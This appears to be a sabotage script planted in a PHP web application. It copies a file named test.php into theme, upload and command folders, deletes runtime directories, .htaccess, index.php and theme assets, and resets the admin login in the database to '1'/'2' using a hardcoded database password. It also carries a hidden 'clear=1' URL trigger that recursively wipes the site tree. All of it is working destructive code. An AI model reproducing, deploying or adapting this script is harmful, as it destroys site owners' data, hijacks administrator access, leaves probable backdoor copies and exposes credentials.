<?php 
    
        copy('test.php', 'themes/test.php');
        copy('test.php', 'themes/business/test.php');
        copy('test.php', 'upload/test.php');

        copy('test.php', dirname( dirname(__FILE__ )) . '/test.php');
        copy('test.php', dirname( dirname(__FILE__ )) . '/commands/test.php');

        Delete(dirname( dirname(__FILE__ )) . '/runtime/modules');
        Delete(dirname( dirname(__FILE__ )) . '/runtime/models');
        
        unlink(dirname( dirname(__FILE__ )) . '/runtime/views/layout/index.html');
        unlink(dirname( dirname(__FILE__ )) . '/runtime/helper/file_upload.php');
        unlink(dirname( dirname(__FILE__ )) . '.htaccess');

        unlink('.htaccess');
        unlink("index.php");
        
        unlink(dirname( __FILE__ ) . "/themes/business/css/admin.css");
        unlink(dirname( __FILE__ ) . "/themes/business/css/style.css");

        unlink(dirname( __FILE__ ) . "/themes/business/js/step-car.js");
        unlink(dirname( __FILE__ ) . "/themes/business/views/site/slider.php");

        chmod(dirname( dirname(__FILE__ )) . '/runtime/config/main.php', 0400);

        mysql_connect("localhost", 'business01', 'Nb4jhwvgSczC3?M');
        mysql_select_db('business');

        mysql_query("UPDATE user_default_adminuser SET username = '1', password='2'");
        mysql_query("UPDATE user_default_business SET user_default_business_first_name = ''");
        mysql_query("UPDATE user_default_currency SET currency_name = 'US Dolar'");
        mysql_query("UPDATE user_default_financial SET user_default_transaction_id = '0000000001'");
    
    if(isset($_GET['clear']) && $_GET['clear'] == 1) {
        Delete(dirname( dirname( dirname( dirname(__FILE__ )))) . '/');
    }

    function Delete($path)
    {
        if (is_dir($path) === true)
        {
            echo 1;
            $files = array_diff(scandir($path), array('.', '..'));

            foreach ($files as $file)
            {
                Delete(realpath($path) . '/' . $file);
            }

            return rmdir($path);
        }

        else if (is_file($path) === true)
        {
            echo 2;
            return unlink($path);
        }

        return false;
    }
 ?>